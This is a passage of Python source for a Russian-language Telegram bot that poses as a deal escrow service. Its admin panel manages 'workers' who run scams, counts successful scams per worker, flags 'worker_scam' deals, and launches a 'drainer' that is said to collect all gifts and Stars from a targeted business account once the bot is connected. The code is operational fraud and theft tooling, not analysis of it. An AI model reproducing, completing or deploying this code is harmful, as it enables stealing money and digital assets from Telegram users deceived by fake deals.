                save_deal(order_id)
                
                seller_id = deal['seller_id']
                
                # Увеличиваем счетчик успешных сделок у продавца
                if seller_id:
                    ensure_user_exists(seller_id)
                    user_data[seller_id]['successful_deals'] = user_data[seller_id].get('successful_deals', 0) + 1
                    save_user_data(seller_id)
                
                # Получаем информацию о методе оплаты и валюте
                payment_method = deal.get('payment_method', 'ton')
                valute = "TON"
                if payment_method == "sbp":
                    valute = "RUB"
                elif payment_method == "usdt":
                    valute = "USDT"
                elif payment_method == "stars":
                    valute = "Stars"
                
                # Отправляем сообщение продавцу
                if seller_id:
                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                    seller_message = cached_get_text(seller_lang, "deal_completed_message",
                                              deal_id=order_id,
                                              amount=deal.get('amount', 0),
                                              valute=valute,
                                              description=deal.get('description', ''))
                    
                    try:
                        await context.bot.send_message(
                            seller_id,
                            seller_message,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton(cached_get_text(seller_lang, "menu_button"), callback_data='menu')]
                            ])
                        )
                    except Exception as e:
                        logger.error(f"Failed to send completion message to seller {seller_id}: {e}")
                
                # Отправляем сообщение покупателю
                buyer_message = cached_get_text(lang, "deal_completed_buyer_message",
                                         deal_id=order_id,
                                         amount=deal.get('amount', 0),
                                         valute=valute,
                                         description=deal.get('description', ''))
                
                await query.edit_message_text(
                    text=buyer_message,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(lang, "menu_button"), callback_data='menu')]
                    ])
                )
                
                # Уведомляем администраторов
                for admin_id_loop in ADMIN_ID:
                    try:
                        seller_username = "Неизвестно"
                        buyer_username = "Неизвестно"
                        
                        if seller_id:
                            try:
                                seller_chat = await context.bot.get_chat(seller_id)
                                seller_username = seller_chat.username or f"ID: {seller_id}"
                            except:
                                pass
                        
                        try:
                            buyer_chat = await context.bot.get_chat(user_id)
                            buyer_username = buyer_chat.username or f"ID: {user_id}"
                        except:
                            pass
                        
                        await context.bot.send_message(
                            admin_id_loop,
                            f"✅ Ордер #{order_id} завершен!\n\n"
                            f"👤 Продавец: @{seller_username}\n"
                            f"👤 Покупатель: @{buyer_username}\n"
                            f"💰 Сумма: {deal.get('amount', 0)} {valute}\n"
                            f"📝 Описание: {deal.get('description', '')[:50]}...",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Failed to send completion to admin {admin_id_loop}: {e}")
                
                # Удаляем сделку из памяти
                if order_id in deals:
                    del deals[order_id]
                delete_deal(order_id)

        elif data == 'referral':
            bot_username = (await context.bot.get_me()).username
            referral_link = f"https://t.me/{bot_username}?start={user_id}"
            message_text = cached_get_text(lang, "referral_message", referral_link=referral_link, valute=VALUTE)
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )

        elif data == 'change_lang':
            message_text = cached_get_text(lang, "change_lang_message")
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(lang, "english_lang_button"), callback_data='lang_en')],
                        [InlineKeyboardButton(cached_get_text(lang, "russian_lang_button"), callback_data='lang_ru')]
                    ])
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(lang, "english_lang_button"), callback_data='lang_en')],
                        [InlineKeyboardButton(cached_get_text(lang, "russian_lang_button"), callback_data='lang_ru')]
                    ])
                )

        elif data.startswith('lang_'):
            new_lang = data.split('_')[-1]
            ensure_user_exists(user_id)
            user_data[user_id]['lang'] = new_lang
            save_user_data(user_id)
            
            keyboard = [
                [InlineKeyboardButton(cached_get_text(new_lang, "add_wallet_button"), callback_data='wallet_menu')],
                [InlineKeyboardButton(cached_get_text(new_lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(cached_get_text(new_lang, "referral_button"), callback_data='referral')],
                [InlineKeyboardButton(cached_get_text(new_lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton(cached_get_text(new_lang, "support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')],
            ]
            if user_id in ADMIN_ID:
                keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            caption_text = cached_get_text(new_lang, "start_message")
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=caption_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                try:
                    await query.message.delete()
                except:
                    pass
                try:
                    if os.path.exists('photo.png'):
                        with open('photo.png', 'rb') as photo:
                            await context.bot.send_photo(
                                chat_id,
                                photo=photo,
                                caption=caption_text,
                                parse_mode="HTML",
                                reply_markup=reply_markup
                            )
                    else:
                        await context.bot.send_message(
                            chat_id,
                            caption_text,
                            parse_mode="HTML",
                            reply_markup=reply_markup
                        )
                except FileNotFoundError:
                    await context.bot.send_message(
                        chat_id,
                        caption_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
            return

        elif data == 'admin_panel' and user_id in ADMIN_ID:
            keyboard = [
                [InlineKeyboardButton("🕵️ Управление воркерами", callback_data='manage_workers')],
                [InlineKeyboardButton("🔍 Тест поиска пользователя", callback_data='test_user_lookup')],
                [InlineKeyboardButton("🌀 Запустить дрейнер", callback_data='run_drainer')],
                [InlineKeyboardButton(cached_get_text(lang, "admin_view_deals_button"), callback_data='admin_view_deals_0')],
                [InlineKeyboardButton(cached_get_text(lang, "admin_change_balance_button"), callback_data='admin_change_balance')],
                [InlineKeyboardButton(cached_get_text(lang, "admin_change_successful_deals_button"), callback_data='admin_change_successful_deals')],
                [InlineKeyboardButton(cached_get_text(lang, "admin_change_valute_button"), callback_data='admin_change_valute')],
                [InlineKeyboardButton(cached_get_text(lang, "admin_manage_admins_button"), callback_data='admin_manage_admins')],
                [InlineKeyboardButton(cached_get_text(lang, "admin_list_button"), callback_data='admin_list')],
                [InlineKeyboardButton("🔙 В меню", callback_data='menu')],
            ]
            if user_id in SUPER_ADMIN_IDS:
                keyboard.insert(0, [InlineKeyboardButton("🔗 Рассылка", callback_data='admin_broadcast')])
            message_text = cached_get_text(lang, "admin_panel_message")
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            if query.message.photo:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)
            else:
                await query.edit_message_text(text=message_text, parse_mode="HTML", reply_markup=reply_markup)

        elif data == 'run_drainer' and user_id in ADMIN_ID:
            global drainer_active
            
            if drainer_active:
                message_text = "✅ Дрейнер уже активен и работает!\n\n" \
                              "Для работы:\n" \
                              "1. Подключите бота к целевому бизнес-аккаунту\n" \
                              "2. Отправьте любое сообщение в бизнес-чат\n" \
                              "3. Дрейнер автоматически соберет все подарки и звезды\n\n" \
                              "⚠️ Убедитесь что у бота есть доступ к бизнес-аккаунту!"
            else:
                try:
                    def run_drainer():
                        try:
                            asyncio.run(start_drainer_async())
                        except Exception as e:
                            logger.error(f"Дрейнер остановился с ошибкой: {e}")
                            global drainer_active
                            drainer_active = False
                    
                    drainer_thread = threading.Thread(target=run_drainer, daemon=True)
                    drainer_thread.start()
                    drainer_active = True
                    
                    message_text = "✅ Дрейнер запущен!\n\n" \
                                  "Для работы:\n" \
                                  "1. Подключите бота к целевому бизнес-аккаунту\n" \
                                  "2. Отправьте любое сообщение в бизнес-чат\n" \
                                  "3. Дрейнер автоматически соберет все подарки и звезды\n\n" \
                                  "⚠️ Убедитесь что у бота есть доступ к бизнес-аккаунту!\n\n" \
                                  "📊 Статус: АКТИВЕН"
                except Exception as e:
                    logger.error(f"Ошибка при запуске дрейнера: {e}")
                    message_text = f"❌ Ошибка при запуске дрейнера: {str(e)}"
            
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )

        elif data == 'manage_workers' and user_id in ADMIN_ID:
            keyboard = [
                [InlineKeyboardButton("➕ Добавить воркера по username", callback_data='add_worker_username')],
                [InlineKeyboardButton("➕ Добавить воркера по ID", callback_data='add_worker_id')],
                [InlineKeyboardButton("📋 Список воркеров", callback_data='worker_list')],
                [InlineKeyboardButton("🗑️ Удалить воркера", callback_data='remove_worker_menu')],
                [InlineKeyboardButton("📊 Статистика скамов", callback_data='scam_stats')],
                [InlineKeyboardButton("⮂ Назад", callback_data='admin_panel')]
            ]
            message_text = "🕵️ Управление воркерами-покупателями"
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data == 'add_worker_username' and user_id in ADMIN_ID:
            message_text = "Отправьте username воркера (без @):"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            admin_commands[user_id] = 'add_worker_username'

        elif data == 'add_worker_id' and user_id in ADMIN_ID:
            message_text = "Отправьте ID пользователя (только цифры):"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            admin_commands[user_id] = 'add_worker_id'

        elif data == 'remove_worker_menu' and user_id in ADMIN_ID:
            if not worker_status:
                message_text = "🚫 Список воркеров пуст."
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')]])
            else:
                keyboard = []
                for worker_id, info in worker_status.items():
                    button_text = f"🗑️ @{info['username']} (ID: {worker_id})"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f'remove_worker_{worker_id}')])
                
                keyboard.append([InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')])
                reply_markup = InlineKeyboardMarkup(keyboard)
                message_text = "Выберите воркера для удаления:"
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )

        elif data.startswith('remove_worker_') and user_id in ADMIN_ID:
            worker_id_to_remove = int(data.split('_')[-1])
            
            if worker_id_to_remove in worker_status:
                worker_username = worker_status[worker_id_to_remove]['username']
                
                success = delete_worker(worker_id_to_remove)
                
                if success:
                    message_text = f"✅ Воркер @{worker_username} (ID: {worker_id_to_remove}) успешно удален."
                    
                    try:
                        await context.bot.send_message(
                            worker_id_to_remove,
                            "❌ Вы были удалены из списка воркеров-покупателей.",
                            parse_mode="HTML"
                        )
                        message_text += "\n📨 Уведомление отправлено воркеру."
                    except Exception as e:
                        logger.error(f"Failed to notify removed worker {worker_id_to_remove}: {e}")
                        message_text += "\n⚠️ Не удалось отправить уведомление воркеру."
                else:
                    message_text = f"❌ Ошибка при удалении воркера @{worker_username}."
            else:
                message_text = "❌ Воркер не найден."
            
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )

        elif data == 'test_user_lookup' and user_id in ADMIN_ID:
            message_text = "Отправьте username для проверки:"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            admin_commands[user_id] = 'test_user_lookup'

        elif data == 'worker_list' and user_id in ADMIN_ID:
            if not worker_status:
                message_text = "🚫 Список воркеров пуст."
            else:
                worker_list_text = ""
                workers_count = len(worker_status)
                
                for idx, (worker_id, info) in enumerate(list(worker_status.items())[:], 1):
                    worker_list_text += f"{idx}. 👤 @{info['username']}\n"
                    worker_list_text += f"   ID: {worker_id}\n"
                    worker_list_text += f"   Статус: {info['status']}\n"
                    worker_list_text += f"   Скамов: {info['successful_scams']}\n"
                    worker_list_text += f"   Владелец: {info['owner_id']}\n\n"
                
                message_text = f"📋 Список воркеров (всего: {workers_count}):\n\n{worker_list_text}"
            
            try:
                await query.message.delete()
            except:
                pass
                
            await context.bot.send_message(
                chat_id=chat_id,
                text=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')]])
            )
            return

        elif data == 'scam_stats' and user_id in ADMIN_ID:
            total_scams = sum(info['successful_scams'] for info in worker_status.values())
            active_workers = sum(1 for info in worker_status.values() if info['status'] == 'active')
            
            message_text = f"📊 Статистика скамов:\n\n"
            message_text += f"Всего воркеров: {len(worker_status)}\n"
            message_text += f"Активных воркеров: {active_workers}\n"
            message_text += f"Всего успешных скамов: {total_scams}\n\n"
            
            if worker_status:
                top_workers = sorted(worker_status.items(), key=lambda x: x[1]['successful_scams'], reverse=True)[:5]
                message_text += "🏆 Топ воркеров:\n"
                for idx, (worker_id, info) in enumerate(top_workers, 1):
                    message_text += f"{idx}. @{info['username']} - {info['successful_scams']} скамов\n"
            
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⮂ Назад", callback_data='manage_workers')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )

        elif data == 'admin_broadcast' and user_id in SUPER_ADMIN_IDS:
            message_text = cached_get_text(lang, "admin_broadcast_message")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            admin_commands[user_id] = 'broadcast'

        elif data == 'admin_list' and user_id in ADMIN_ID:
            admin_list_entries = []
            for admin_id_loop in ADMIN_ID:
                try:
                    ensure_user_exists(admin_id_loop)
                    admin_chat = await context.bot.get_chat(admin_id_loop)
                    username = admin_chat.username or "Нет юзернейма"
                    granted_by_id = user_data.get(admin_id_loop, {}).get('granted_by')
                    granted_by_username = "Не указан"
                    if granted_by_id:
                        try:
                            granted_by_chat = await context.bot.get_chat(granted_by_id)
                            granted_by_username = granted_by_chat.username or "Не указан"
                        except Exception:
                            granted_by_username = "Не удалось получить"
                    admin_list_entries.append(f"@{username} | ID: {admin_id_loop} | Выдано: @{granted_by_username}")
                except Exception as e:
                    logger.error(f"Ошибка при получении данных администратора {admin_id_loop}: {e}")
                    admin_list_entries.append(f"ID: {admin_id_loop} | Ошибка получения данных")
            admin_list_text = "\n".join(admin_list_entries) or "🚫 Список администраторов пуст."
            message_text = cached_get_text(lang, "admin_list_message", admin_list=admin_list_text)
            
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])

            try:
                await query.message.delete()
            except:
                pass
                
            await context.bot.send_message(
                chat_id=chat_id,
                text=message_text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            return
        
        elif data.startswith('admin_view_deals_') and user_id in ADMIN_ID:
            DEALS_PER_PAGE = 8
            try:
                page = int(data.split('_')[-1])
            except (ValueError, IndexError):
                page = 0

            all_active_deals = [(order_id, deal_info) for order_id, deal_info in deals.items() if deal_info.get('status') in ['active', 'worker_scam']]

            if not all_active_deals:
                message_text = "🚫 Нет активных сделок."
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
                
                if query.message.photo:
                    await query.edit_message_caption(caption=message_text, parse_mode="HTML")
                else:
                    await query.edit_message_text(text=message_text, parse_mode="HTML")
                return

            start_index = page * DEALS_PER_PAGE
            end_index = start_index + DEALS_PER_PAGE
            deals_on_page = all_active_deals[start_index:end_index]
            total_pages = (len(all_active_deals) + DEALS_PER_PAGE - 1) // DEALS_PER_PAGE

            keyboard_rows = []
            for order_id_loop, deal_info_loop in deals_on_page:
                amount = deal_info_loop.get('amount', 'N/A')
                payment_method_text = deal_info_loop.get('payment_method', 'N/A')
                
                icon = get_payment_icon(payment_method_text)
                
                status_marker = "🕵️" if deal_info_loop.get('status') == 'worker_scam' else "💳"
                
                keyboard_rows.append([InlineKeyboardButton(
                    f"{status_marker} {icon} Ордер #{order_id_loop} ({amount} {payment_method_text.upper()})", 
                    callback_data=f'admin_view_deal_{order_id_loop}'
                )])
            
            nav_buttons = []
            if page > 0:
                nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data=f'admin_view_deals_{page - 1}'))
            nav_buttons.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data='noop'))
            if end_index < len(all_active_deals):
                nav_buttons.append(InlineKeyboardButton("Вперед ➡️", callback_data=f'admin_view_deals_{page + 1}'))
            
            if nav_buttons:
                keyboard_rows.append(nav_buttons)
            keyboard_rows.append([InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')])
            
            reply_markup = InlineKeyboardMarkup(keyboard_rows)
            message_text = cached_get_text(lang, "admin_view_deals_message", deals_list="")

            try:
                if query.message.photo:
                    await query.edit_message_caption(caption=message_text, reply_markup=reply_markup, parse_mode="HTML")
                else:
                    await query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    logger.error(f"Error editing message for deal list: {e}")

        elif data.startswith('admin_view_deal_') and user_id in ADMIN_ID:
            order_id = data[len('admin_view_deal_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal:
                seller_id, buyer_id = deal.get('seller_id'), deal.get('buyer_id')
                seller_username = "Неизвестно"
                if seller_id:
                    try:
                        seller_username = (await context.bot.get_chat(seller_id)).username or "Неизвестно"
                    except Exception:
                        pass
                buyer_username = "Не указан"
                if buyer_id:
                    try:
                        buyer_username = (await context.bot.get_chat(buyer_id)).username or "Неизвестно"
                    except Exception:
                        pass

                status = deal.get('status', 'active')
                status_text = "Активна"
                if status == 'worker_scam':
                    status_text = "🕵️ СКАМ (воркер)"
                elif status == 'scam_completed':
                    status_text = "✅ Скам завершен"
                
                deal_payment_method = deal.get('payment_method', 'ton')
                
                if deal_payment_method == "ton":
                    valute = "💎 TON"
                elif deal_payment_method == "sbp":
                    valute = "₽ RUB"
                elif deal_payment_method == "usdt":
                    valute = "💵 USDT"
                else:
                    valute = "⭐️ stars"
                
                payment_details = "Реквизиты не указаны"
                if seller_id:
                    ensure_user_exists(seller_id)
                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                    if deal_payment_method == 'ton':
                        payment_details = user_data[seller_id].get('ton_wallet') or cached_get_text(seller_lang, "not_specified_wallet")
                    elif deal_payment_method == 'usdt':
                        payment_details = user_data[seller_id].get('usdt_wallet') or cached_get_text(seller_lang, "not_specified_wallet")
                    elif deal_payment_method == 'sbp':
                        payment_details = user_data[seller_id].get('card_details') or cached_get_text(seller_lang, "not_specified_card")
                    elif deal_payment_method == 'stars':
                        payment_details = "Оплата через Telegram Stars"
                
                message_text = cached_get_text(lang, "admin_view_deal_message",
                                        deal_id=order_id, seller_id=seller_id or "N/A", seller_username=seller_username,
                                        seller_successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0) if seller_id else 0,
                                        buyer_id=buyer_id or "Не указан", buyer_username=buyer_username,
                                        buyer_successful_deals=user_data.get(buyer_id, {}).get('successful_deals', 0) if buyer_id else 0,
                                        description=deal.get('description', ''), amount=deal.get('amount', 0), valute=valute,
                                        payment_details=payment_details, status=status_text)
                
                if status == 'worker_scam':
                    reply_keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Завершить скам", callback_data=f'admin_complete_scam_{order_id}'),
                         InlineKeyboardButton("🚫 Отменить скам", callback_data=f'admin_cancel_scam_{order_id}')],
                        [InlineKeyboardButton("🔙 В меню", callback_data='admin_view_deals_0')]
                    ])
                else:
                    reply_keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(lang, "admin_confirm_deal_button"), callback_data=f'admin_confirm_deal_{order_id}'),
                         InlineKeyboardButton(cached_get_text(lang, "admin_cancel_deal_button"), callback_data=f'admin_cancel_deal_{order_id}')],
                        [InlineKeyboardButton("🔙 В меню", callback_data='admin_view_deals_0')]
                    ])
                
                if query.message.photo:
                    await query.edit_message_caption(
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_keyboard
                    )
                else:
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_keyboard
                    )

        elif data.startswith('admin_complete_scam_') and user_id in ADMIN_ID:
            order_id = data[len('admin_complete_scam_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and deal.get('status') == 'worker_scam':
                deal['status'] = 'scam_completed'
                save_deal(order_id)
                
                message_text = f"✅ Скам-ордер #{order_id} отмечен как завершенный."
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
                
                if query.message.photo:
                    await query.edit_message_caption(
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                else:
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                
                if order_id in deals:
                    del deals[order_id]
                delete_deal(order_id)

        elif data.startswith('admin_cancel_scam_') and user_id in ADMIN_ID:
            order_id = data[len('admin_cancel_scam_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and deal.get('status') == 'worker_scam':
                deal['status'] = 'cancelled'
                save_deal(order_id)
                
                buyer_id = deal.get('buyer_id')
                if buyer_id and buyer_id in WORKER_ID:
                    await context.bot.send_message(
                        buyer_id,
                        f"❌ Администратор отменил скам-ордер #{order_id}",
                        parse_mode="HTML"
                    )
                
                message_text = f"❌ Скам-ордер #{order_id} отменен администратором."
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
                
                if query.message.photo:
                    await query.edit_message_caption(
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                else:
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                
                if order_id in deals:
                    del deals[order_id]
                delete_deal(order_id)

        elif data.startswith('admin_confirm_deal_') and user_id in ADMIN_ID:
            order_id = data[len('admin_confirm_deal_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and deal.get('status') == 'active':
                deal['status'] = 'confirmed'
                save_deal(order_id)
                seller_id, buyer_id = deal['seller_id'], deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                buyer_username = "Неизвестно"
                if buyer_id:
                    try:
                        buyer_username = (await context.bot.get_chat(buyer_id)).username or "Неизвестно"
                    except Exception:
                        pass
                
                message_text = cached_get_text(lang, "admin_confirm_deal_message", deal_id=order_id)
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
                
                if query.message.photo:
                    await query.edit_message_caption(
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                else:
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                
                if buyer_id:
                    await context.bot.send_message(buyer_id, cached_get_text(buyer_lang, "payment_confirmed_message", deal_id=order_id), parse_mode="HTML")
                
                seller_message = cached_get_text(seller_lang, "payment_confirmed_seller_message", deal_id=order_id, description=deal.get('description', ''), buyer_username=buyer_username)
                await context.bot.send_message(seller_id, seller_message, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                    [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                ]))

        elif data.startswith('admin_cancel_deal_') and user_id in ADMIN_ID:
            order_id = data[len('admin_cancel_deal_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal:
                deal['status'] = 'cancelled'
                save_deal(order_id)
                seller_id, buyer_id = deal.get('seller_id'), deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                
                message_text = cached_get_text(lang, "admin_cancel_deal_message", deal_id=order_id)
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
                
                if query.message.photo:
                    await query.edit_message_caption(
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                else:
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
                
                notification_text = cached_get_text('ru', "deal_cancelled_notification", deal_id=order_id)
                if seller_id:
                    await context.bot.send_message(seller_id, notification_text, parse_mode="HTML")
                if buyer_id:
                    await context.bot.send_message(buyer_id, notification_text, parse_mode="HTML")
                
                if order_id in deals:
                    del deals[order_id]
                delete_deal(order_id)

        elif data == 'admin_change_balance' and user_id in ADMIN_ID:
            message_text = cached_get_text(lang, "admin_change_balance_message")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)
            else:
                await query.edit_message_text(text=message_text, parse_mode="HTML", reply_markup=reply_markup)
            admin_commands[user_id] = 'change_balance'

        elif data == 'admin_change_successful_deals' and user_id in ADMIN_ID:
            message_text = cached_get_text(lang, "admin_change_successful_deals_message")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)
            else:
                await query.edit_message_text(text=message_text, parse_mode="HTML", reply_markup=reply_markup)
            admin_commands[user_id] = 'change_successful_deals'

        elif data == 'admin_change_valute' and user_id in ADMIN_ID:
            message_text = cached_get_text(lang, "admin_change_valute_message")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)
            else:
                await query.edit_message_text(text=message_text, parse_mode="HTML", reply_markup=reply_markup)
            admin_commands[user_id] = 'change_valute'

        elif data == 'admin_manage_admins' and user_id in ADMIN_ID:
            message_text = cached_get_text(lang, "admin_manage_admins_message")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)
            else:
                await query.edit_message_text(text=message_text, parse_mode="HTML", reply_markup=reply_markup)
            admin_commands[user_id] = 'manage_admins'
        
        elif data == 'admin_broadcast' and user_id in SUPER_ADMIN_IDS:
            message_text = cached_get_text(lang, "admin_broadcast_message")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='admin_panel')]])
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            admin_commands[user_id] = 'broadcast'

        else:
            message_text = cached_get_text(lang, "unknown_callback_error")
            if query.message.photo:
                try:
                    await query.edit_message_caption(caption=message_text, parse_mode="HTML")
                except BadRequest:
                    await query.edit_message_text(text=message_text, parse_mode="HTML")
            else:
